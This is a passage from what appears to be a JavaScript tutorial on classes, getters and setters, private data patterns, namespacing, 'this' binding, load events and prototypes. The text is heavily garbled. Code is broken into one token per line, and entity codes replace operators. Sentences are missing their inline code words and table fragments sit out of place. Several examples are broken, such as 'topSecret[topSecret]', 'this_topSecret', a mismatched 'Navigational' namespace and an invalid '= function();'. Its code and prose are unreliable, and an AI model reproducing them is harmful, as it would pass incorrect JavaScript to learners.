<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-4">Section 22.4: Getters and Setters</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

Getters and setters allow you to define custom behaviour for reading
and writing a given property on your class. To the user, they appear
the same as any typical property. However, internally a custom
function you provide is used to determine the value when the property
is accessed (the getter), and to perform any necessary changes when
the property is assigned (the setter).

In a class definition, a getter is written like a no-argument method
prefixed by the **get** keyword. A setter is similar, except that it
accepts one argument (the new value being assigned) and the **set**
keyword is used instead.

  
  name
  

  

  
  names&lowbar;
  

  

Here&apos;s an example class which provides a getter and setter for its .
property. Each time it&apos;s assigned, we&apos;ll record the new name in an
internal . array. Each time it&apos;s accessed, we&apos;ll return the latest
name.

class

MyClass

{

constructor

(

)

{

**this**

.

names&lowbar;

=

&lbrack;

&rbrack;

;

}

**set**

name

(

value

)

{

**this**

.

names&lowbar;

.

push

(

value

)

;

}

**get**

name

(

)

{

**return**

**this**

.

names&lowbar;

&lbrack;

**this**

.

names&lowbar;

.

length

&minus;

1

&rbrack;

;

}

}

**const**

myClassInstance

=

**new**

MyClass

(

)

;

myClassInstance.

name

=

&apos;Joe&apos;

;

myClassInstance.

name

=

&apos;Bob&apos;

;

console.

log

(

myClassInstance.

name

)

;

*// logs: &quot;Bob&quot;*

console.

log

(

myClassInstance.

names&lowbar;

)

;

*// logs: &lbrack;&quot;Joe&quot;, &quot;Bob&quot;&rbrack;*

If you only define a setter, attempting to access the property will
always return **undefined**.

**const**

classInstance

=

**new**

class

{

**set**

prop

(

value

)

{

console.

log

(

&apos;setting&apos;

,

value

)

;

}

}

;

classInstance.

prop

=

10

;

*// logs: &quot;setting&quot;, 10*

console.

log

(

classInstance.

prop

)

;

*// logs: undefined*

If you only define a getter, attempting to assign the property will
have no effect.

**const**

classInstance

=

**new**

class

{

**get**

prop

(

)

{

**return**

5

;

}

}

;

classInstance.

prop

=

10

;

console.

log

(

classInstance.

prop

)

;

*// logs: 5*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-5">Section 22.5: Private Members</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

JavaScript does not technically support private members as a language
feature. Privacy - [described by Douglas
Crockford](http://javascript.crockford.com/private.html) - gets
emulated instead via closures (preserved function scope) that will be
generated each with every instantiation call of a constructor
function.
>
The Queue example demonstrates how, with constructor functions, local
state can be preserved and made accessible too via privileged methods.

class

Queue

{

constructor

(

)

{

*// - does generate a closure with each instantiation.*

**const**

list

=

&lbrack;

&rbrack;

;

*// - local state (&quot;private member&quot;).*

**this**

.

enqueue

=

**function**

(

type

)

{

*// - privileged public method*

*// accessing the local state*

list.

push

(

type

)

;

*// &quot;writing&quot; alike.*

**return**

type

;

}

;

**this**

.

dequeue

=

**function**

(

)

{

*// - privileged public method*

*// accessing the local state*

**return**

list.

shift

(

)

;

*// &quot;reading / writing&quot; alike.*

}

;

}

}

**var**

q

=

**new**

Queue

;

*//*

*//*

q&period;

enqueue

(

9

)

;

*// &hellip; first in &hellip;*

q&period;

enqueue

(

8

)

;

*//*

q&period;

enqueue

(

7

)

;

*//*

*//*

console.

log

(

q&period;

dequeue

(

)

)

;

*// 9 &hellip; first out.*

console.

log

(

q&period;

dequeue

(

)

)

;

*// 8*

console.

log

(

q&period;

dequeue

(

)

)

;

*// 7*

console.

log

(

q

)

;

*// {}*

console.

log

(

Object

.

keys

(

q

)

)

;

*// &lbrack;&quot;enqueue&quot;,&quot;dequeue&quot;&rbrack;*

With every instantiation of a Queue type the constructor generates a
closure.

  
  Object                                 .      keys
    

  

Thus both of a Queue type&apos;s own methods enqueue and dequeue (see (q))
still do have access to list that continues to *live* in its enclosing
scope that, at construction time, has been preserved.
>
Making use of this pattern - emulating private members via privileged
public methods - one should keep in mind that, with every instance,
additional memory will be consumed for every *own property* method
(for it is code that can&apos;t be shared/reused). The same is true for
the amount/size of state that is going to be stored within such a
closure.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-6">Section 22.6: Methods</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

Methods can be defined in classes to perform a function and optionally
return a result. They can receive arguments from the caller.

class

Something

{

constructor

(

data

)

{

**this**

.

data

=

data

}

doSomething

(

text

)

{

**return**

{

data

:

**this**

.

data

,

text

}

}

}

**var**

s

=

**new**

Something

(

{

}

)

s&period;

doSomething

(

&quot;hi&quot;

)

*// returns: { data: {}, text: &quot;hi&quot; }*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-7">Section 22.7: Dynamic Method Names</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
There is also the ability to evaluate expressions when naming methods
similar to how you can access an objects&apos; properties with &lbrack;&rbrack;. This
can be useful for having dynamic property names, however is often used
in conjunction with Symbols.

**let**

METADATA

=

Symbol

(

&apos;metadata&apos;

)

;

class

Car

{

constructor

(

make

,

model

)

{

**this**

.

make

=

make

;

**this**

.

model

=

model

;

}

*// example using symbols*

&lbrack;

METADATA

&rbrack;

(

)

{

**return**

{

make

:

**this**

.

make

,

model

:

**this**

.

model

}

;

}

*// you can also use any javascript expression*

*// this one is just a string, and could also be defined with simply
add()*

&lbrack;

&quot;add&quot;

&rbrack;

(

a

,

b

)

{

**return**

a

&plus;

b

;

}

*// this one is dynamically evaluated*

&lbrack;

1

&plus;

2

&rbrack;

(

)

{

**return**

&quot;three&quot;

;

}

}

**let**

MazdaMPV

=

**new**

Car

(

&quot;Mazda&quot;

,

&quot;MPV&quot;

)

;

MazdaMPV.

add

(

4

,
5
)
;
*// 9*
MazdaMPV
&lbrack;
3
&rbrack;
(
)
;
*// &quot;three&quot;*
MazdaMPV
&lbrack;
METADATA
&rbrack;
(
)
;
*// { make: &quot;Mazda&quot;, model: &quot;MPV&quot; }*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-8">Section 22.8: Managing Private Data with Classes</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
One of the most common obstacles using classes is finding the proper
approach to handle private states. There are 4 common solutions for
handling private states:

**Using Symbols**

Symbols are new primitive type introduced on in ES2015, as defined at
[MDN](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Symbol)

A symbol is a unique and immutable data type that may be used as an
identifier for object properties.

When using symbol as a property key, it is not enumerable.

  -
  **for** **var** **in**        or       Object            .   keys
      

  -

As such, they won&apos;t be revealed using .
>
Thus we can use symbols to store private data.

**const**

topSecret

=

Symbol

(

&apos;topSecret&apos;

)

;

*// our private key; will only be accessible on the scope of*

*the module file*

export

class

SecretAgent

{

constructor

(

secret

)

{

**this**

&lbrack;

topSecret

&rbrack;

=

secret

;

*// we have access to the symbol key (closure)*

**this**

.

coverStory

=

&apos;just a simple gardner&apos;

;

**this**

.

doMission

=

(

)

=&gt;

{

figureWhatToDo

(

topSecret

&lbrack;

topSecret

&rbrack;

)

;

*// we have access to topSecret*

}

;

}

}

Because symbols are unique, we must have reference to the original
symbol to access the private property.

import

{

SecretAgent

}

from

&apos;SecretAgent.js&apos;

**const** agent = **new** SecretAgent(&apos;steal all the ice cream&apos;);
*// ok let&apos;s try to get the secret out of him!*
>
Object.keys(agent); *// &lbrack;&apos;coverStory&apos;&rbrack; only cover story is public,
our secret is kept.*
>
agent&lbrack;Symbol(&apos;topSecret&apos;)&rbrack;; *// undefined, as we said, symbols are
always unique, so only the original symbol will help us to get the
data.*

  
  Object          .   getOwnPropertySymbols
    -

  

But it&apos;s not 100% private; let&apos;s break that agent down! We can use
the method to get the object symbols.
>
**const** secretKeys = Object.getOwnPropertySymbols(agent);
agent&lbrack;secretKeys&lbrack;0&rbrack;&rbrack; *// &apos;steal all the ice cream&apos; , we got the
secret.*
>
**Using WeakMaps**
>
WeakMap is a new type of object that have been added for es6.
>
As defined on
[MDN](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Symbolhttps:/developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/WeakMap)
>
The WeakMap object is a collection of key/value pairs in which the
keys are weakly referenced. The keys must be objects and the values
can be arbitrary values.
>
Another important feature of WeakMap is, as defined on
[MDN](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/WeakMap).
>
The key in a WeakMap is held weakly. What this means is that, if there
are no other strong references to the key, the entire entry will be
removed from the WeakMap by the garbage collector.
>
The idea is to use the WeakMap, as a static map for the whole class,
to hold each instance as key and keep the private data as a value for
that instance key.
>
Thus only inside the class will we have access to the WeakMap
collection.
>
Let&apos;s give our agent a try, with WeakMap:

**const**

topSecret

=

**new**

WeakMap

(

)

;

*// will hold all private data of all instances.*

export

class

SecretAgent

{

constructor

(

secret

)

{

topSecret.

**set**

(

**this**

,

secret

)

;

*// we use this, as the key, to set it on our instance private*

*data*

**this**

.

coverStory

=

&apos;just a simple gardner&apos;

;

**this**

.

doMission

=

(

)

=&gt;

{

figureWhatToDo

(

topSecret.

**get**

(

**this**

)

)

;

*// we have access to topSecret*

}

;

}

}

Because the const topSecret is defined inside our module closure, and
since we didn&apos;t bind it to our instance properties, this approach is
totally private, and we can&apos;t reach the agent topSecret.
>
**Define all methods inside the constructor**
>
The idea here is simply to define all our methods and members inside
the constructor and use the closure to access private members without
assigning them to **this**.

export

class

SecretAgent

{

constructor

(

secret

)

{

**const**

topSecret

=

secret

;

**this**

.

coverStory

=

&apos;just a simple gardner&apos;

;

**this**

.

doMission

=

(

)

=&gt;

{

figureWhatToDo

(

topSecret

)

;

*// we have access to topSecret*

}

;

}

}

In this example as well the data is 100% private and can&apos;t be reached
outside the class, so our agent is safe.
>
**Using naming conventions**
>
We will decide that any property who is private will be prefixed with
&lowbar;.
>
Note that for this approach the data isn&apos;t really private.

export

class

SecretAgent

{

constructor

(

secret

)

{

**this**

.&lowbar;topSecret

=

secret

;

*// it private by convention*

**this**

.

coverStory

=

&apos;just a simple gardner&apos;

;

**this**

.

doMission

=

(

)

=&gt;

{

figureWhatToDo

(

this_topSecret

)

;

}

;

}

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch22-9">Section 22.9: Class Name binding</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

ClassDeclaration&apos;s Name is bound in different ways in different
scopes -

1.  The scope in which the class is defined - **let** binding

  
  class
  

  

2.  The scope of the class itself - within { and } in {} - **const**
    binding

class

Foo

{

*// Foo inside this block is a const binding*

}

*// Foo here is a let binding*

For example,

class

A

{

foo

(

)

{

A

=

**null**

;

*// will throw at runtime as A inside the class is a &grave;const&grave; binding*

}

}

A

=

**null**

;

*// will NOT throw as A here is a &grave;let&grave; binding*

This is not the same for a Function -

**function**

A

(

)

{

A

=

**null**

;

*// works*

}

A.

**prototype**

.

foo

=

**function**

foo

(

)

{

A

=

**null**

;

*// works*

}

A

=

**null**

;

*// works*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch23">Chapter 23: Namespacing</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch23-1">Section 23.1: Namespace by direct assignment</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

*//Before: antipattern 3 global variables*

**var**

setActivePage

=

**function**

(

)

{

}

;

**var**

getPage

=

**function**

(

)

{

}

;

**var**

redirectPage

=

**function**

(

)

{

}

;

*//After: just 1 global variable, no function collision and more
meaningful function names*

**var**

NavigationNs

=

NavigationNs

&vert;&vert;

{

}

;

NavigationNs.

active

=

**function**

(

)

{

}

NavigationNs.

pagination

=

**function**

(

)

{

}

NavigationNs.

redirection

=

**function**

(

)

{

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch23-2">Section 23.2: Nested Namespaces</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
When multiple modules are involved, avoid proliferating global names
by creating a single global namespace. From there, any sub-modules can
be added to the global namespace. (Further nesting will slow down
performance and add unnecessary complexity.) Longer names can be used
if name clashes are an issue:

**var**

NavigationNs

=

NavigationNs

&vert;&vert;

{

}

;

NavigationNs.

active

=

{

}

;

NavigationNs.

pagination

=

{

}

;

NavigationNs.

redirection

=

{

}

;

*// The second level start here.*

Navigational.

pagination

.

jquery

=

**function**

(

)

;

Navigational.

pagination

.

angular

=

**function**

(

)

;

Navigational.

pagination

.

ember

=

**function**

(

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch24">Chapter 24: Context (this)</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch24-1">Section 24.1: this with simple objects</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**var**

person

=

{

name

:

&apos;John Doe&apos;

,

age

:

42

,

gender

:

&apos;male&apos;

,

bio

:

**function**

(

)

{

console.

log

(

&apos;My name is &apos;

&plus;

**this**

.

name

)

;

}

}

;

person.

bio

(

)

;

*// logs &quot;My name is John Doe&quot;*

**var**

bio

=

person.

bio

;

bio

(

)

;

*// logs &quot;My name is undefined&quot;*

  -
  person.bio   makes use of the **context** (**this**). When the    person.bio
               function is called as                                
    

  -

In the above code, (), the
>
context gets passed automatically, and so it correctly logs &quot;My name
is John Doe&quot;. When assigning the function to a variable though, it
loses its context.
>
In non-strict mode, the default context is the global object (window).
In strict mode it is **undefined**.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch24-2">Section 24.2: Saving this for use in nested functions / objects</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
One common pitfall is to try and use **this** in a nested function or
an object, where the context has been lost.

document.

getElementById

(

&apos;myAJAXButton&apos;

)

.

onclick

=

**function**

(

)

{

makeAJAXRequest

(

**function**

(

result

)

{

**if**

(

result

)

{

*// success*

**this**

.

className

=

&apos;success&apos;

;

}

}

)

}

Here the context (**this**) is lost in the inner callback function. To
correct this, you can save the value of **this** in a variable:

document.

getElementById

(

&apos;myAJAXButton&apos;

)

.

onclick

=

**function**

(

)

{

**var**

self

=

**this**

;

makeAJAXRequest

(

**function**

(

result

)

{

**if**

(

result

)

{

*// success*

self.

className

=

&apos;success&apos;

;

}

}

)

}

Version ≥ 6

ES6 introduced arrow functions which include lexical **this** binding.
The above example could be written like this:

document.

getElementById

(

&apos;myAJAXButton&apos;

)

.

onclick

=

**function**

(

)

{

makeAJAXRequest

(

result

=&gt;

{

**if**

(

result

)

{

*// success*

**this**

.

className

=

&apos;success&apos;

;

}

}

)

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch24-3">Section 24.3: Binding function context</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Version ≥ 5.1

Every function has a bind method, which will create a wrapped function
that will call it with the correct context. See here for more
information.

**var**

monitor

=

{

threshold

:

5

,

check

:

**function**

(

value

)

{

**if**

(

value

&gt;

**this**

.

threshold

)

{

**this**

.

display

(

&quot;Value is too high!&quot;

)

;

}

}

,

display

(

message

)

{

alert

(

message

)

;

}

}

;

monitor.

check

(

7

)

;

*// The value of &grave;this&grave; is implied by the method call syntax.*

**var**

badCheck

=

monitor.

check

;

badCheck

(

15

)

;

*// The value of &grave;this&grave; is window object and this.threshold is
undefined, so value &gt;*

*this.threshold is false*

**var**

check

=

monitor.

check

.

bind

(

monitor

)

;

check

(

15

)

;

*// This value of &grave;this&grave; was explicitly bound, the function works.*

**var**

check8

=

monitor.

check

.

bind

(

monitor

,

8

)

;

check8

(

)

;

*// We also bound the argument to &grave;8&grave; here. It can&apos;t be
re-specified.*

**Hard binding**

The object of

*hard binding*

is to &quot;hard&quot; link a reference to

**this**

.

Advantage: It&apos;s useful when you want to protect particular objects from
being lost.

Example:

**function**

Person

(

)

{

console.

log

(

&quot;I&apos;m &quot;

&plus;

**this**

.

name

)

;

}

**var**

person0

=

{

name

:

&quot;Stackoverflow&quot;

}

**var**

person1

=

{

name

:

&quot;John&quot;

}

;

**var**

person2

=

{

name

:

&quot;Doe&quot;

}

;

**var**

person3

=

{

name

:

&quot;Ala Eddine JEBALI&quot;

}

;

**var**

origin

=

Person

;

Person

=

**function**

(

)

{

origin.

call

(

person0

)

;

}

Person

(

)

;

*//outputs: I&apos;m Stackoverflow*

Person.

call

(

person1

)

;

*//outputs: I&apos;m Stackoverflow*

Person.

apply

(

person2

)

;

*//outputs: I&apos;m Stackoverflow*

Person.

call

(

person3

)

;

*//outputs: I&apos;m Stackoverflow*

So, as you can remark in the example above, whatever object you pass to

*Person*

, it&apos;ll always use

*person0*

*object*

:

**it&apos;s hard binded**

.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch24-4">Section 24.4: this in constructor functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

When using a function as a constructor, it has a special **this**
binding, which refers to the newly created object:

**function**

Cat

(

name

)

{

**this**

.

name

=

name

;

**this**

.

sound

=

&quot;Meow&quot;

;

}

**var**

cat

=

**new**

Cat

(

&quot;Tom&quot;

)

;

*// is a Cat object*

cat.

sound

;

*// Returns &quot;Meow&quot;*

**var**

cat2

=

Cat

(

&quot;Tom&quot;

)

;

*// is undefined &bsol; function got executed in global context*

window.

name

;

*// &quot;Tom&quot;*

cat2.

name

;

*// error! cannot access property of undefined*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch25">Chapter 25: Setters and Getters</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Setters and getters are object properties that call a function when
they are set/gotten.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch25-1">Section 25.1: Defining a Setter/Getter Using Object.defineProperty</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**var**

setValue

;

**var**

obj

=

{

}

;

Object

.

defineProperty

(

obj

,

&quot;objProperty&quot;

,

{

**get**

:

**function**

(

)

{

**return**

&quot;a value&quot;

;

}

,

**set**

:

**function**

(

value

)

{

setValue

=

value

;

}

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch25-2">Section 25.2: Defining an Setter/Getter in a Newly Created Object</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

JavaScript allows us to define getters and setters in the object
literal syntax. Here&apos;s an example:

**var**

date

=

{

year

:

&apos;2017&apos;

,

month

:

&apos;02&apos;

,

day

:

&apos;27&apos;

,

**get**

date

(

)

{

*// Get the date in YYYY-MM-DD format*

**return**

&grave;&dollar;

{

**this**

.

year

}

&minus;

&dollar;

{

**this**

.

month

}

&minus;

&dollar;

{

**this**

.

day

}

&grave;

}

,

**set**

date

(

dateString

)

{

*// Set the date from a YYYY-MM-DD formatted string*

**var**

dateRegExp

=

*/(&bsol;&bsol;d{4})-(&bsol;&bsol;d{2})-(&bsol;&bsol;d{2})/*

;

*// Check that the string is correctly formatted*

**if**

(

dateRegExp.

test

(

dateString

)

)

{

**var**

parsedDate

=

dateRegExp.

exec

(

dateString

)

;

**this**

.

year

=

parsedDate

&lbrack;

1

&rbrack;

;

**this**

.

month

=

parsedDate

&lbrack;

2

&rbrack;

;

**this**

.

day

=

parsedDate

&lbrack;

3

&rbrack;

;

}

**else**

{

**throw**

**new**

Error

(

&apos;Date string must be in YYYY-MM-DD format&apos;

)

;

}

}

}

;

  
  date.date   property would return the  2017-02-27   . Setting date.date =
              value                                             &apos;2018-01-02
      

  

Accessing the would call

  
  date.year = &apos;2018&apos;                ,   date.month = &apos;01&apos;
    

  

the setter function, which would then parse the string and set , and

  
  date.day = &apos;02&apos;
  

  

. Trying to pass an incorrectly formatted string (such as &quot;hello&quot;)
would throw an error.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch25-3">Section 25.3: Defining getters and setters in ES6 class</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

class

Person

{

constructor

(

firstname

,

lastname

)

{

**this**

.&lowbar;firstname

=

firstname

;

**this**

.&lowbar;lastname

=

lastname

;

}

**get**

firstname

(

)

{

**return**

**this**

.&lowbar;firstname

;

}

**set**

firstname

(

name

)

{

**this**

.&lowbar;firstname

=

name

;

}

**get**

lastname

(

)

{

**return**

**this**

.&lowbar;lastname

;

}

**set**

lastname

(

name

)

{

**this**

.&lowbar;lastname

=

name

;

}

}

**let**

person

=

**new**

Person

(

&apos;John&apos;

,

&apos;Doe&apos;

)

;

console.

log

(

person.

firstname

,

person.

lastname

)

;

*// John Doe*

person.

firstname

=

&apos;Foo&apos;

;

person.

lastname

=

&apos;Bar&apos;

;

console.

log

(

person.

firstname

,

person.

lastname

)

;

*// Foo Bar*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch26">Chapter 26: Events</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch26-1">Section 26.1: Page, DOM and Browser loading</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

This is an example to explain the variations of load events.

1.  **onload event**

**&lt;**

**body**

onload

=

&quot;someFunction()&quot;

**&gt;**

**&lt;**

**img**

src

=

&quot;image1&quot;

**/&gt;**

**&lt;**

**img**

src

=

&quot;image2&quot;

**/&gt;**

**&lt;**

**/body**

**&gt;**

**&lt;**

**script**

**&gt;**

function someFunction() {

console.log(&quot;Hi! I am loaded&quot;);

}

**&lt;**

**/script**

**&gt;**

In this case, the message is logged once *all the contents of the page
including the images and stylesheets(if any)* are completely loaded.

2.  **DOMContentLoaded event**

document.

addEventListener

(

&quot;DOMContentLoaded&quot;

,

**function**

(

event

)

{

console.

log

(

&quot;Hello! I am loaded&quot;

)

;

}

)

;

In the above code, the message is logged only after the DOM/document
is loaded (*ie:once the DOM is constructed*).

3.  **Self-invoking anonymous function**

(

**function**

(

)

{

console.

log

(

&quot;Hi I am an anonymous function! I am loaded&quot;

)

;

}

)

(

)

;

Here, the message gets logged as soon as the browser interprets the
anonymous function. It means, this function can get executed even
before the DOM is loaded.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch27">Chapter 27: Inheritance</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch27-1">Section 27.1: Standard function prototype</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Start by defining a Foo function that we&apos;ll use as a constructor.

**function**

Foo

(

)

{

}

  
  Foo.**prototype**
  

  

By editing , we can define properties and methods that will be shared
by all instances of Foo.

Foo.

**prototype**

.

bar

=

**function**

(

)

{

**return**

&apos;I am bar&apos;

;

}

;

We can then create an instance using the **new** keyword, and call the
method.

**var**

foo

=

**new**

Foo

(

)

;

console.

log

(

foo.

bar

(

)

)

;

*// logs &grave;I am bar&grave;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch27-2">Section 27.2: Difference between Object.key and Object.prototype.key</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Unlike in languages like Python, static properties of the constructor
function are *not* inherited to instances. Instances only inherit from
their prototype, which inherits from the parent type&apos;s prototype.
Static properties are never inherited.

**function**

Foo

(

)

{

}

;

Foo.

style

=

&apos;bold&apos;

;

**var**

foo

=

**new**

Foo

(

)

;

console.

log

(

Foo.

style

)

;

*// &apos;bold&apos;*

console.

log

(

foo.

style

)

;

*// undefined*

Foo.

**prototype**

.

style

=

&apos;italic&apos;

;

console.

log

(

Foo.

style

)

;

*// &apos;bold&apos;*

console.

log

(

foo.

style

)

;

*// &apos;italic&apos;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch27-3">Section 27.3: Prototypal inheritance</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Suppose we have a plain object called **prototype**: **var**
**prototype** = { foo: &apos;foo&apos;, bar: **function** () { **return**
**this**.foo; } };
>
Now we want another object called obj that inherits from
